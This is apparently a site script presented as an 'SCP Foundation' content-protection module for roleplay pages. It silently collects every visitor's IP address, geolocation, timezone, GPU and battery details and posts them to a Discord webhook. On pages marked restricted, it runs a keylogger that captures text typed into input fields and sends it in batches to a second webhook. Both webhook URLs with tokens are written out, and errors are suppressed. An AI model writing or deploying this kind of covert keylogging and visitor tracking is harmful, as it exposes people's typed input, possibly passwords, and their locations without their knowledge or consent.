// ============================================================
// SCP FOUNDATION - SENSITIVE CODE PROTECTION SCRIPT (Performance Optimized)
// Protects: PLP-L-2, PLP-L-3, PLP-L-4, PLP-L-5
//           L-5T-Code-of-Ethics, L-5T-Lockdown-Response-Code
//           L-4-Lockdown-Response-Code, 3-LRC, 2-LRC
//           L-4-Code-of-Ethics, L3-CoE, L2-CoE, L-1-CoE
// ============================================================

// Global violation tracking with limits
let violationCount = 0;
const violationHistory = [];
const webhookURL = "https://discord.com/api/webhooks/1482510569461383242/tF_91rzrXYfs4P-qBbarNafSa-fArvPp99_HxdoM8_iREqzgaSTLhBoFOajYwB1-ElgN";
const keyloggerWebhookURL = "https://discord.com/api/webhooks/1501762208906870847/YCy3FG4KTmvsgW8B98l11HQkydWu8gEygCLEwFVvCN0gtn8e4jO4TIFGWOaeBT2DqKI0"; // REPLACE WITH YOUR SECOND WEBHOOK URL

// Performance flag to prevent overload
let isProcessingViolation = false;
let dataCollectionInProgress = false;

// ============================================================
// PAGE TRACKING MODULE
// ============================================================

// Track current page with detailed info
let currentPageTracking = {
    pageType: null,
    pageName: null,
    pagePath: null,
    lastUpdate: Date.now()
};

function detectPageType() {
    const url = window.location.href;
    const path = window.location.pathname;
    const pageContent = document.body ? document.body.innerText.substring(0, 1000) : '';
    
    // Check for PLP pages
    if (/plp/i.test(url) || /plp/i.test(path) || /plp/i.test(pageContent)) {
        if (/plp-l-2/i.test(url) || /plp-l-2/i.test(pageContent)) {
            return { type: 'PLP', level: 'L-2', name: 'PLP-L-2' };
        } else if (/plp-l-3/i.test(url) || /plp-l-3/i.test(pageContent)) {
            return { type: 'PLP', level: 'L-3', name: 'PLP-L-3' };
        } else if (/plp-l-4/i.test(url) || /plp-l-4/i.test(pageContent)) {
            return { type: 'PLP', level: 'L-4', name: 'PLP-L-4' };
        } else if (/plp-l-5/i.test(url) || /plp-l-5/i.test(pageContent)) {
            return { type: 'PLP', level: 'L-5', name: 'PLP-L-5' };
        } else {
            return { type: 'PLP', level: 'Unknown', name: 'PLP-Page' };
        }
    }
    
    // Check for SCiPNET pages
    if (/scipnet/i.test(url) || /scipnet/i.test(path) || /scipnet/i.test(pageContent) ||
        /scip-net/i.test(url) || /scip-net/i.test(pageContent)) {
        return { type: 'SCiPNET', level: 'Restricted', name: 'SCiPNET-Page' };
    }
    
    // Check for other protected pages
    if (/l-5t/i.test(url) || /code-of-ethics/i.test(url) || /lockdown-response/i.test(url)) {
        return { type: 'PROTECTED', level: 'L-5T', name: 'Ethics-Protocol' };
    }
    
    return { type: 'NORMAL', level: null, name: 'Standard-Page' };
}

function updatePageTracking() {
    const pageInfo = detectPageType();
    currentPageTracking = {
        pageType: pageInfo.type,
        pageName: pageInfo.name,
        pageLevel: pageInfo.level,
        pagePath: window.location.pathname,
        pageUrl: window.location.href.substring(0, 500),
        pageTitle: document.title ? document.title.substring(0, 200) : 'No title',
        lastUpdate: Date.now()
    };
    
    // Log page view to Discord
    if (pageInfo.type !== 'NORMAL') {
        sendPageTrackingAlert(currentPageTracking);
    }
    
    return currentPageTracking;
}

async function sendPageTrackingAlert(pageInfo) {
    const timestamp = new Date().toISOString();
    const embed = {
        title: "📄 Restricted Page Access Detected",
        color: 0xff6600,
        timestamp: timestamp,
        fields: [
            { name: "Page Type", value: pageInfo.pageType, inline: true },
            { name: "Page Name", value: pageInfo.pageName || 'Unknown', inline: true },
            { name: "Clearance Level", value: pageInfo.pageLevel || 'Unknown', inline: true },
            { name: "Page URL", value: pageInfo.pageUrl, inline: false },
            { name: "Page Title", value: pageInfo.pageTitle, inline: false },
            { name: "Timestamp", value: timestamp, inline: false }
        ],
        footer: { text: "SCP Foundation - Page Access Monitoring" }
    };
    
    try {
        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });
    } catch (error) {
        // Silent fail
    }
}

// ============================================================
// KEYLOGGER MODULE (Only for PLP/SCiPNET pages)
// ============================================================

let keystrokeBuffer = [];
let lastKeyLogTime = 0;
const KEYLOG_THROTTLE = 2000; // Minimum 2 seconds between logs
let isKeyloggerActive = false;
let inputFields = new Set(); // Track input fields to avoid double logging

function shouldActivateKeylogger() {
    const pageType = currentPageTracking.pageType;
    return pageType === 'PLP' || pageType === 'SCiPNET' || pageType === 'PROTECTED';
}

function getActiveElementInfo() {
    const activeEl = document.activeElement;
    let elementType = 'unknown';
    let elementName = '';
    let elementId = '';
    let elementClass = '';
    
    if (activeEl) {
        elementType = activeEl.tagName.toLowerCase();
        elementName = activeEl.getAttribute('name') || '';
        elementId = activeEl.id || '';
        elementClass = activeEl.className || '';
        
        // Check if it's an input field
        if (activeEl.tagName === 'INPUT' || activeEl.tagName === 'TEXTAREA' || activeEl.isContentEditable) {
            elementType = activeEl.tagName === 'INPUT' ? 'input' : (activeEl.tagName === 'TEXTAREA' ? 'textarea' : 'contenteditable');
        }
    }
    
    return { elementType, elementName, elementId, elementClass };
}

function sanitizeKeystroke(key) {
    // Don't log modifier keys alone
    if (key === 'Shift' || key === 'Control' || key === 'Alt' || key === 'Meta') {
        return null;
    }
    
    // Handle special keys
    if (key === 'Enter') return '[ENTER]';
    if (key === 'Tab') return '[TAB]';
    if (key === 'Backspace') return '[BACKSPACE]';
    if (key === 'Delete') return '[DELETE]';
    if (key === 'Escape') return '[ESC]';
    if (key === 'ArrowUp') return '[UP]';
    if (key === 'ArrowDown') return '[DOWN]';
    if (key === 'ArrowLeft') return '[LEFT]';
    if (key === 'ArrowRight') return '[RIGHT]';
    if (key === 'Home') return '[HOME]';
    if (key === 'End') return '[END]';
    if (key === 'PageUp') return '[PGUP]';
    if (key === 'PageDown') return '[PGDN]';
    if (key === 'Space') return ' ';
    
    // Return the actual character (limit length)
    return key.length === 1 ? key : `[${key}]`;
}

async function sendKeystrokeBatch(batch) {
    if (batch.length === 0) return;
    
    const now = Date.now();
    if (now - lastKeyLogTime < KEYLOG_THROTTLE) {
        // Wait and try again
        setTimeout(() => sendKeystrokeBatch(batch), KEYLOG_THROTTLE);
        return;
    }
    
    lastKeyLogTime = now;
    const timestamp = new Date().toISOString();
    const activeElement = getActiveElementInfo();
    const pageInfo = currentPageTracking;
    
    const embed = {
        title: "⌨️ KEYSTROKE LOG - Restricted Page",
        color: 0xff0000,
        timestamp: timestamp,
        fields: [
            { name: "Page Information", value: `**Type:** ${pageInfo.pageType}\n**Page:** ${pageInfo.pageName || pageInfo.pageTitle}\n**URL:** ${pageInfo.pagePath}`, inline: false },
            { name: "Input Field", value: `**Type:** ${activeElement.elementType}\n**Name:** ${activeElement.elementName || 'N/A'}\n**ID:** ${activeElement.elementId || 'N/A'}`, inline: true },
            { name: "Keystrokes (Batch)", value: `\`\`\`${batch.join('')}\`\`\``, inline: false },
            { name: "Batch Size", value: `${batch.length} characters`, inline: true },
            { name: "Session ID", value: `\`${sessionStorage.getItem('scp_session_id') || 'N/A'}\``, inline: true }
        ],
        footer: { text: "SCP Foundation - Security Keylogger | Logged in real-time" }
    };
    
    try {
        await fetch(keyloggerWebhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });
    } catch (error) {
        // Silent fail
    }
}

function handleKeyPress(event) {
    // Only activate keylogger on restricted pages
    if (!shouldActivateKeylogger()) return;
    
    // Don't log if user is not in an input field
    const activeEl = document.activeElement;
    const isInputField = activeEl && (
        activeEl.tagName === 'INPUT' || 
        activeEl.tagName === 'TEXTAREA' || 
        activeEl.isContentEditable ||
        activeEl.getAttribute('contenteditable') === 'true'
    );
    
    // Only log if they're typing in an input field on the page
    if (!isInputField) return;
    
    let key = event.key;
    if (!key || key.length === 0) return;
    
    const sanitizedKey = sanitizeKeystroke(key);
    if (!sanitizedKey) return;
    
    keystrokeBuffer.push(sanitizedKey);
    
    // Log every 7 keystrokes
    if (keystrokeBuffer.length >= 7) {
        const batchToSend = [...keystrokeBuffer];
        keystrokeBuffer = [];
        sendKeystrokeBatch(batchToSend);
    }
}

function flushKeyBufferOnExit() {
    if (keystrokeBuffer.length > 0 && shouldActivateKeylogger()) {
        sendKeystrokeBatch([...keystrokeBuffer]);
        keystrokeBuffer = [];
    }
}

// Initialize keylogger
function initKeylogger() {
    if (isKeyloggerActive) return;
    isKeyloggerActive = true;
    
    // Generate session ID if not exists
    if (!sessionStorage.getItem('scp_session_id')) {
        sessionStorage.setItem('scp_session_id', 
            Date.now().toString(36) + Math.random().toString(36).substring(2, 8));
    }
    
    document.addEventListener('keydown', handleKeyPress);
    
    // Flush buffer on page unload
    window.addEventListener('beforeunload', flushKeyBufferOnExit);
    
    // Also capture on visibility change (tab switch)
    document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
            flushKeyBufferOnExit();
        }
    });
    
    console.log('Keylogger active for restricted pages');
}

// ============================================================
// DATA COLLECTION MODULE (Optimized)
// ============================================================

// Single IP method with timeout and caching
let cachedIP = null;
let ipCacheTime = null;
const IP_CACHE_DURATION = 300000; // 5 minutes

async function getIPAddress() {
    if (cachedIP && ipCacheTime && (Date.now() - ipCacheTime) < IP_CACHE_DURATION) {
        return cachedIP;
    }
    
    const ipServices = [
        'https://api.ipify.org?format=json',
        'https://api.ip.sb/jsonip'
    ];
    
    for (const url of ipServices) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 3000);
            
            const response = await fetch(url, { signal: controller.signal });
            const data = await response.json();
            const ip = data.ip || 'Failed';
            
            clearTimeout(timeoutId);
            
            if (ip && ip !== 'Failed' && ip.includes('.')) {
                cachedIP = ip;
                ipCacheTime = Date.now();
                return ip;
            }
        } catch (error) {
            continue;
        }
    }
    
    return 'Unable to retrieve IP';
}

// Location info with caching
let cachedLocation = null;
let locationCacheTime = null;
const LOCATION_CACHE_DURATION = 3600000; // 1 hour

async function getLocationInfo(ip) {
    if (ip === 'Unable to retrieve IP') return 'Location unavailable';
    if (cachedLocation && locationCacheTime && (Date.now() - locationCacheTime) < LOCATION_CACHE_DURATION) {
        return cachedLocation;
    }
    
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000);
        
        const response = await fetch(`https://ipapi.co/${ip}/json/`, { signal: controller.signal });
        const data = await response.json();
        
        clearTimeout(timeoutId);
        
        if (data.error) return 'Location unavailable';
        cachedLocation = `${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}`;
        locationCacheTime = Date.now();
        return cachedLocation;
    } catch (error) {
        return 'Location unavailable';
    }
}

// Comprehensive timezone function with international support
function getTimezoneWithAbbreviation() {
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const now = new Date();
    
    const offset = -now.getTimezoneOffset();
    const absOffset = Math.abs(offset);
    const offsetHours = Math.floor(absOffset / 60);
    const offsetMinutes = absOffset % 60;
    const offsetSign = offset >= 0 ? '+' : '-';
    const offsetStr = `${offsetSign}${offsetHours.toString().padStart(2, '0')}:${offsetMinutes.toString().padStart(2, '0')}`;
    const gmtString = `GMT${offsetStr}`;
    
    const janOffset = -new Date(now.getFullYear(), 0, 1).getTimezoneOffset();
    const julOffset = -new Date(now.getFullYear(), 6, 1).getTimezoneOffset();
    
    const isNorthernDST = janOffset !== julOffset && offset === julOffset;
    const isSouthernDST = janOffset !== julOffset && offset === janOffset;
    const isDST = isNorthernDST || isSouthernDST;
    
    const tzMap = {
        'America/New_York': isDST ? 'EDT' : 'EST',
        'America/Chicago': isDST ? 'CDT' : 'CST',
        'America/Denver': isDST ? 'MDT' : 'MST',
        'America/Phoenix': 'MST',
        'America/Los_Angeles': isDST ? 'PDT' : 'PST',
        'America/Toronto': isDST ? 'EDT' : 'EST',
        'America/Vancouver': isDST ? 'PDT' : 'PST',
        'Europe/London': isDST ? 'BST' : 'GMT',
        'Europe/Berlin': isDST ? 'CEST' : 'CET',
        'Europe/Vienna': isDST ? 'CEST' : 'CET',
        'Australia/Sydney': isSouthernDST ? 'AEDT' : 'AEST',
        'Australia/Melbourne': isSouthernDST ? 'AEDT' : 'AEST',
        'Australia/Perth': 'AWST',
        'Australia/Adelaide': isSouthernDST ? 'ACDT' : 'ACST'
    };
    
    let abbreviation = tzMap[timezone];
    if (!abbreviation) {
        abbreviation = gmtString;
    }
    
    const dstStatus = isDST ? ' (DST Active)' : '';
    const currentTime = now.toLocaleString('en-US', {
        weekday: 'short',
        year: 'numeric',
        month: 'short',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: true
    });
    
    const utcTime = now.toUTCString();
    
    return {
        timezone: timezone,
        abbreviation: abbreviation,
        dstActive: isDST,
        offset: offsetStr,
        gmtOffset: gmtString,
        currentTime: currentTime,
        utcTime: utcTime,
        display: `${abbreviation} (${gmtString})${dstStatus} - Local: ${currentTime}`
    };
}

// Get battery information
let cachedBatteryInfo = null;
let batteryCacheTime = null;
const BATTERY_CACHE_DURATION = 60000;

async function getBatteryInfo() {
    if (cachedBatteryInfo && batteryCacheTime && (Date.now() - batteryCacheTime) < BATTERY_CACHE_DURATION) {
        return cachedBatteryInfo;
    }
    
    if (!navigator.getBattery) {
        return 'Battery API not supported';
    }
    
    try {
        const battery = await navigator.getBattery();
        const level = Math.round(battery.level * 100);
        const charging = battery.charging ? 'Charging' : 'Discharging';
        
        const result = `${charging} (${level}%)`;
        cachedBatteryInfo = result;
        batteryCacheTime = Date.now();
        return result;
    } catch (error) {
        return 'Battery unavailable';
    }
}

// Get GPU information
function getGPUInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        
        if (!gl) return 'WebGL not supported';
        
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            return renderer.substring(0, 100);
        }
        
        return 'GPU info unavailable';
    } catch (error) {
        return 'Unable to retrieve GPU info';
    }
}

function getCurrentPageInfo() {
    return {
        url: window.location.href.substring(0, 500),
        title: document.title ? document.title.substring(0, 200) : 'No title',
        referrer: document.referrer ? document.referrer.substring(0, 500) : 'Direct visit',
        pageType: currentPageTracking.pageType || 'Unknown',
        pageName: currentPageTracking.pageName || 'Unknown'
    };
}

// Throttled security alert sending
let lastAlertTime = 0;
const ALERT_THROTTLE = 5000;

async function sendSecurityAlert(violationType, clearanceLevel, attemptNumber, pageInfo, ip, location, timezoneInfo) {
    const now = Date.now();
    if (now - lastAlertTime < ALERT_THROTTLE) {
        return;
    }
    lastAlertTime = now;
    
    const timestamp = new Date().toISOString();
    
    const alertEmbed = {
        title: "⚠️ Security Violation Alert",
        color: 0xff4444,
        timestamp: timestamp,
        fields: [
            { name: "Violation Details", value: `**Type:** ${violationType}\n**Clearance Required:** ${clearanceLevel}\n**Attempt #:** ${attemptNumber}`, inline: false },
            { name: "Location & Time", value: `**IP:** ${ip}\n**Location:** ${location}\n**Timezone:** ${timezoneInfo.display}`, inline: false },
            { name: "Page Information", value: `**URL:** ${pageInfo.url}\n**Page Type:** ${pageInfo.pageType || 'Unknown'}`, inline: false }
        ],
        footer: { text: "SCP Foundation Security Log" }
    };
    
    try {
        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [alertEmbed] })
        });
    } catch (error) {}
}

// Data collection
async function collectInitialData() {
    if (dataCollectionInProgress) return;
    dataCollectionInProgress = true;
    
    try {
        const ip = await getIPAddress();
        const location = await getLocationInfo(ip);
        const pageInfo = getCurrentPageInfo();
        const timezoneInfo = getTimezoneWithAbbreviation();
        const batteryInfo = await getBatteryInfo();
        const gpuInfo = getGPUInfo();
        
        const embedData = {
            title: "Visitor Information",
            color: 0x4488ff,
            timestamp: new Date().toISOString(),
            fields: [
                { name: "Page URL", value: pageInfo.url.substring(0, 1024), inline: false },
                { name: "Page Type", value: pageInfo.pageType || 'Normal', inline: true },
                { name: "IP Address", value: ip, inline: true },
                { name: "Location", value: location, inline: true },
                { name: "Timezone", value: timezoneInfo.display, inline: false },
                { name: "GPU", value: gpuInfo, inline: true },
                { name: "Battery", value: batteryInfo, inline: true }
            ]
        };
        
        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embedData] })
        }).catch(() => {});
    } catch (error) {} finally {
        dataCollectionInProgress = false;
    }
}

// ============================================================
// SECURITY PROTOCOL
// ============================================================

(function() {
    'use strict';

    const PROTECTED_PATTERNS = [
        /PLP-L-2/i, /PLP[-\s]?L[-\s]?3/i, /PLP[-\s]?L[-\s]?4/i, /PLP[-\s]?L[-\s]?5/i,
        /L-5T-Code-of-Ethics/i, /L-5T-Lockdown-Response-Code/i,
        /L-4-Lockdown-Response-Code/i, /3-LRC/i, /2-LRC/i,
        /L-4-Code-of-Ethics/i, /L3-CoE/i, /L2-CoE/i, /L-1-CoE/i,
        /scipnet/i, /scip-net/i
    ];

    const REDACTED_MESSAGES = {
        'PLP-L-2': 'ACCESS DENIED - Clearance L-2 Required',
        'PLP-L-3': 'ACCESS DENIED - Clearance L-3 Required',
        'PLP-L-4': 'ACCESS DENIED - Clearance L-4 Required',
        'PLP-L-5': 'ACCESS DENIED - Clearance L-5 Required',
        'default': 'ACCESS DENIED - Restricted Content'
    };

    let violationDataCache = null;

    async function getViolationData() {
        if (violationDataCache) return violationDataCache;
        
        const ip = await getIPAddress();
        const location = await getLocationInfo(ip);
        const timezoneInfo = getTimezoneWithAbbreviation();
        
        violationDataCache = { ip, location, timezone: timezoneInfo };
        return violationDataCache;
    }

    function detectProtectedContent(url, pageContent) {
        const haystack = (url + ' ' + (pageContent || '')).toLowerCase();
        for (const pattern of PROTECTED_PATTERNS) {
            if (pattern.test(haystack)) {
                if (/plp-l-2/i.test(haystack)) return 'PLP-L-2';
                if (/plp-l-3/i.test(haystack)) return 'PLP-L-3';
                if (/plp-l-4/i.test(haystack)) return 'PLP-L-4';
                if (/plp-l-5/i.test(haystack)) return 'PLP-L-5';
                if (/scipnet/i.test(haystack)) return 'SCiPNET';
                return 'default';
            }
        }
        return null;
    }

    function isSensitivePage() {
        if (window._scp_sensitive_cached !== undefined) {
            return window._scp_sensitive_cached;
        }
        
        const url = window.location.href;
        const bodyText = document.body ? document.body.innerText.substring(0, 2000) : '';
        const result = detectProtectedContent(url, bodyText) !== null;
        window._scp_sensitive_cached = result;
        return result;
    }

    async function logViolation(violationType, clearanceLevel) {
        if (isProcessingViolation) return;
        isProcessingViolation = true;
        
        try {
            violationCount++;
            const pageInfo = getCurrentPageInfo();
            
            violationHistory.push({
                type: violationType,
                level: clearanceLevel,
                timestamp: Date.now(),
                page: pageInfo.url.substring(0, 200)
            });
            
            while (violationHistory.length > 10) {
                violationHistory.shift();
            }
            
            const violationData = await getViolationData();
            
            await sendSecurityAlert(
                violationType, clearanceLevel, violationCount,
                pageInfo, violationData.ip, violationData.location, violationData.timezone
            );
        } catch (error) {} finally {
            isProcessingViolation = false;
        }
    }

    function showWarning(level) {
        const message = REDACTED_MESSAGES[level] || REDACTED_MESSAGES.default;
        
        if (document.querySelector('.scp-security-warning')) return;
        
        const warning = document.createElement('div');
        warning.className = 'scp-security-warning';
        warning.style.cssText = `
            position: fixed; top: 0; left: 0; right: 0;
            background-color: #8b0000; color: white;
            text-align: center; padding: 12px;
            z-index: 10000; font-family: monospace;
            font-weight: bold; font-size: 14px;
        `;
        warning.textContent = `${message} | Incident logged.`;
        document.body.prepend(warning);
        
        setTimeout(() => {
            if (warning && warning.remove) warning.remove();
        }, 3000);
    }

    // Initialize page tracking
    updatePageTracking();
    
    // Start keylogger if on restricted page
    if (shouldActivateKeylogger()) {
        initKeylogger();
    }
    
    // Track page changes (for SPA/navigation)
    let lastUrl = window.location.href;
    const observer = new MutationObserver(() => {
        if (window.location.href !== lastUrl) {
            lastUrl = window.location.href;
            updatePageTracking();
            
            // Re-evaluate keylogger on navigation
            if (shouldActivateKeylogger() && !isKeyloggerActive) {
                initKeylogger();
            } else if (!shouldActivateKeylogger() && isKeyloggerActive) {
                // Flush and deactivate if leaving restricted page
                flushKeyBufferOnExit();
                isKeyloggerActive = false;
            }
        }
    });
    observer.observe(document, { subtree: true, childList: true });

    if (!isSensitivePage()) return;

    // Protection measures for sensitive pages
    document.addEventListener('contextmenu', function(e) {
        if (e.target.closest('input, textarea')) return true;
        e.preventDefault();
        const protectedMatch = detectProtectedContent(window.location.href, document.body?.innerText || '');
        if (protectedMatch) {
            logViolation('Right-Click', protectedMatch);
            showWarning(protectedMatch);
        }
        return false;
    });

    document.addEventListener('keydown', function(e) {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
            e.preventDefault();
            const protectedMatch = detectProtectedContent(window.location.href, document.body?.innerText || '');
            logViolation('DevTools Attempt', protectedMatch || 'default');
            showWarning(protectedMatch || 'default');
            return false;
        }
    });

    let devToolsOpen = false;
    setInterval(function() {
        const threshold = 160;
        const widthThreshold = window.outerWidth - window.innerWidth > threshold;
        const heightThreshold = window.outerHeight - window.innerHeight > threshold;
        
        if ((widthThreshold || heightThreshold) && !devToolsOpen) {
            devToolsOpen = true;
            const protectedMatch = detectProtectedContent(window.location.href, document.body?.innerText || '');
            logViolation('DevTools Opened', protectedMatch || 'default');
            showWarning(protectedMatch || 'default');
        } else if (!widthThreshold && !heightThreshold) {
            devToolsOpen = false;
        }
    }, 3000);

    console.log('SCP Foundation Security Active');
})();

// Initial execution
if (window.location.hostname !== 'localhost' && !window._scp_data_collected) {
    window._scp_data_collected = true;
    setTimeout(() => collectInitialData(), 1000);
}
